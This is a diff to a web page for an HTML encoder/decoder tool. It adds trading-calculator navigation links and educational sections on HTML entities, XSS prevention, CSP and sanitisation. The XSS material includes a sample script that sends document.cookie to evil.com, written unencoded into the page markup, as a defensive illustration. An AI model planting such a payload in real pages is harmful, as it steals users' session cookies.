@@ -10,7 +10,7 @@
 <link rel="apple-touch-icon" href="favicon.svg">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="style.css?v=13">
+<link rel="stylesheet" href="style.css?v=14">
 <link rel="manifest" href="/manifest.json">
 <meta name="theme-color" content="#7fff6f">
 <meta name="mobile-web-app-capable" content="yes">
@@ -178,6 +178,20 @@ gtag('config', 'G-S6PPGS7N63');
     <a href="risk-of-ruin-calculator.html" class="nav-link">Risk of Ruin</a>
     <a href="leverage-calculator.html" class="nav-link">Leverage</a>
     <a href="stop-loss-take-profit-calculator.html" class="nav-link">SL/TP Calculator</a>
+    <div class="nav-divider"></div>
+    <span class="nav-category-label">🏆 Prop Firm Tools</span>
+    <a href="prop-firm-challenge-calculator.html" class="nav-link">Challenge Calculator</a>
+    <a href="daily-drawdown-calculator.html"      class="nav-link">Daily Drawdown</a>
+    <a href="consistency-calculator.html"         class="nav-link">Consistency Calculator</a>
+    <a href="profit-target-tracker.html"          class="nav-link">Profit Target Tracker</a>
+    <a href="challenge-pass-probability.html"     class="nav-link">Pass Probability</a>
+    <a href="funded-account-roi-calculator.html"  class="nav-link">Funded ROI</a>
+    <a href="position-scaling-calculator.html"    class="nav-link">Position Scaling</a>
+    <a href="kelly-criterion-calculator.html"    class="nav-link">Kelly Criterion</a>
+    <a href="win-rate-expectancy-calculator.html"  class="nav-link">Win Rate &amp; Expectancy</a>
+    <a href="forex-swap-calculator.html"           class="nav-link">Forex Swap</a>
+    <a href="currency-correlation-calculator.html" class="nav-link">Currency Correlation</a>
+    <a href="monte-carlo-simulator.html"       class="nav-link">Monte Carlo Sim</a>
   </nav>
 </header>
 <div class="page-hero">
@@ -213,7 +227,48 @@ gtag('config', 'G-S6PPGS7N63');
         style="min-height:180px;white-space:pre-wrap;cursor:pointer;font-size:.82rem"></div>
     </div>
   </div>
-<section class="faq-section">
+
+  <!-- EDUCATIONAL CONTENT -->
+
+  <section class="edu-section">
+    <h2>How to Use the HTML Encoder/Decoder</h2>
+    <ol class="edu-steps">
+      <li><strong>Choose encode or decode</strong> — Encode converts HTML special characters to entities. Decode converts entities back to characters.</li>
+      <li><strong>Enter your text or HTML</strong> — paste the content containing special characters (encode) or HTML entities (decode).</li>
+      <li><strong>Read the output</strong> — encoded output is safe for embedding in HTML. Decoded output shows the original readable text.</li>
+      <li><strong>Select encoding depth</strong> — minimal encoding converts only the five essential characters. Full encoding converts all non-ASCII characters to named or numeric entities.</li>
+      <li><strong>Copy the result</strong> — use in your HTML template, database query, or email template.</li>
+    </ol>
+    <div class="edu-highlight"><strong>🛡️ Security critical:</strong> Always HTML-encode user-supplied content before inserting it into HTML. Failure to encode is the cause of Cross-Site Scripting (XSS) — one of the most common web security vulnerabilities. A malicious user entering <script>alert('XSS')</script> as their name will execute JavaScript in other users' browsers if not encoded first.</div>
+
+  </section>
+
+  <section class="edu-section">
+    <h2>Understanding HTML Encoding</h2>
+    <div class="edu-grid">
+      <div class="edu-card"><div class="edu-card-title">🔤 The Five Essential Entities</div><div class="edu-card-body">< becomes &lt; (less than). > becomes &gt; (greater than). & becomes &amp; (ampersand). " becomes &quot; (double quote in attributes). ' becomes &#x27; or &apos; (single quote in attributes). These five characters have special meaning in HTML and MUST be encoded in user-supplied content.</div></div>
+      <div class="edu-card"><div class="edu-card-title">📊 Named vs Numeric Entities</div><div class="edu-card-body">Named entities use descriptive names: &amp; &lt; &gt; &copy; &euro; &pound;. Numeric entities use decimal (&#169;) or hex (&#xA9;) Unicode code points. Named entities are more readable; numeric entities work for any Unicode character regardless of browser entity support. Both are fully equivalent to browsers.</div></div>
+      <div class="edu-card"><div class="edu-card-title">🛡️ XSS Prevention</div><div class="edu-card-body">Cross-Site Scripting occurs when user input is rendered as HTML without encoding. <script>document.location='https://evil.com?c='+document.cookie</script> entered as a username steals cookies if not encoded. Encoded: &lt;script&gt; is displayed as text, not executed. HTML encoding is the primary XSS defence.</div></div>
+      <div class="edu-card"><div class="edu-card-title">🗄️ Database Storage</div><div class="edu-card-body">The classic mistake: storing HTML-encoded content in databases. Store raw text in databases; encode at display time. Storing encoded content causes double-encoding issues (&amp;amp;) when displayed. The encoding layer belongs in the template or view layer, not the data storage layer.</div></div>
+      <div class="edu-card"><div class="edu-card-title">📧 HTML Email</div><div class="edu-card-body">Email templates require careful HTML encoding because email clients have inconsistent HTML support and security restrictions. Ampersands in URLs within email HTML must be encoded: href='search?a=1&amp;b=2'. Special characters in email subject lines require MIME encoding (different from HTML encoding). Test HTML emails in multiple clients before sending.</div></div>
+      <div class="edu-card"><div class="edu-card-title">🌐 Content Security Policy</div><div class="edu-card-body">HTML encoding prevents XSS but CSP (Content-Security-Policy header) provides defence in depth. CSP specifies which scripts are allowed to execute: Content-Security-Policy: default-src 'self'; script-src 'nonce-{random}'. Even if XSS encoding fails, CSP prevents injected scripts from running. HTML encoding + CSP = comprehensive XSS protection.</div></div>
+    </div>
+
+  </section>
+
+  <section class="edu-section">
+    <h2>HTML Security in Web Development</h2>
+    <h3>Template engine auto-escaping</h3>
+    <p>Modern template engines escape HTML by default: React's JSX escapes all JSX expressions. Jinja2 (Python) auto-escapes when autoescape=True. Django templates auto-escape all variables. Vue.js escapes all mustache expressions. Handlebars escapes all {{expressions}}. The dangerous exception: each framework provides a way to render raw HTML (React's dangerouslySetInnerHTML, Jinja2's | safe filter) — these bypass escaping and must only be used with trusted, sanitised content.</p>
+    <h3>Output encoding contexts</h3>
+    <p>Encoding requirements differ by context. HTML body: &lt; &gt; &amp; must be encoded. HTML attribute: additionally encode quotes. JavaScript string: use JSON.stringify() or JS string escaping. URL parameter: percent-encode with encodeURIComponent(). CSS value: avoid user input in CSS; if necessary, validate strictly. Inline event handler: requires both HTML and JavaScript encoding. Using the wrong encoding for the context creates vulnerabilities even when encoding is applied.</p>
+    <h3>Sanitisation vs encoding</h3>
+    <p>HTML encoding converts all special characters to entities — safe but preserves all content as text. HTML sanitisation allows some HTML (bold, links) while removing dangerous elements (scripts). Sanitisation is needed when you want to allow user-formatted content (like a rich text editor). Use a proven sanitisation library (DOMPurify for JavaScript, Bleach for Python) — never write your own sanitiser. Encoding and sanitisation are complementary, not alternatives.</p>
+    <div class="edu-highlight"><strong>🛡️ XSS prevention checklist:</strong> Encode all user content before HTML insertion ✓. Use template engines with auto-escaping ✓. Implement Content-Security-Policy headers ✓. Validate input on the server side ✓. Use HttpOnly cookies to protect session tokens ✓. Avoid innerHTML — use textContent for user data ✓. Regular security scanning with OWASP ZAP or similar ✓. These practices together make XSS practically impossible.</div>
+
+  </section>
+
+  <section class="faq-section">
   <h2 class="faq-title">Frequently Asked Questions</h2>
   <div class="faq-item">
     <div class="faq-q" onclick="faqToggle(this)">What is HTML encoding?</div>
@@ -255,9 +310,9 @@ gtag('config', 'G-S6PPGS7N63');
   </nav>
 </footer>
 <div class="copy-toast" id="toast"></div>
-<script src="app.js?v=13"></script>
+<script src="app.js?v=14"></script>
 <script>
-if ('serviceWorker' in navigator) {
+if ('serviceWorker' in navigator && location.hostname === 'toolsnova.net') {
   window.addEventListener('load', () => {
     navigator.serviceWorker.register('/sw.js')
       .then(reg => console.log('[ToolsNova] SW registered:', reg.scope))
